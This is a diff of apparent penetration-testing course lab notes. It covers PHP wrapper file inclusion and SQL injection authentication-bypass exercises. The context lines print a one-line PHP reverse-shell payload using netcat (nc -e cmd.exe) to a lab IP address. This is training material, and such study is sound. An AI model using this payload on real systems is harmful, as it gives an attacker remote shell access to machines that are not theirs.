@@ -92,3 +92,17 @@ We simply append the php wrapper `file=data:text/plain,hello world` to the end o
 2.  Use a PHP wrapper to get a shell on your Windows 10 lab machine.
 For this we replace the "hello world" at the end of our previous URL with a php script designed to execute code, we also place a reverse shell as our payload for the shell_exec to execute.
 `<?php echo shell_exec("nc -e cmd.exe 192.168.119.231 9001") ?>`
+
+
+# 9.9.4 SQL Injection - Authentication Bypass
+#### Exercises
+
+_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
+
+1.  Interact with the MariaDB database and manually execute the commands required to authenticate to the application. Understand the vulnerability.
+
+2.  SQL inject the username field to bypass the login process.
+
+3.  Why is the username displayed like it is in the web application once the authentication process is bypassed?
+
+4.  Execute the SQL injection in the password field. Is the "LIMIT 1" necessary in the payload? Why or why not?
